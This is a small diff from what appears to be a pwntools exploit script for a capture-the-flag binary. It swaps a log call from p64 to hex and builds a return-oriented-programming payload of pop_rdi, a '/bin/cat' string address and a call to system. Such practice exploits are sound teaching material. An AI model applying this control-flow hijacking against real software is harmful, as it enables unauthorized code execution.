@@ -18,7 +18,7 @@ bincat = 0x601060 #0x601060 - 0x601071
 
 
 
-log.info(p64(usefulFunctiondirectsursys))
+log.info(hex(usefulFunctiondirectsursys))
 
 payload = flat({offset:[pop_rdi,bincat,usefulFunctiondirectsursys]})
 
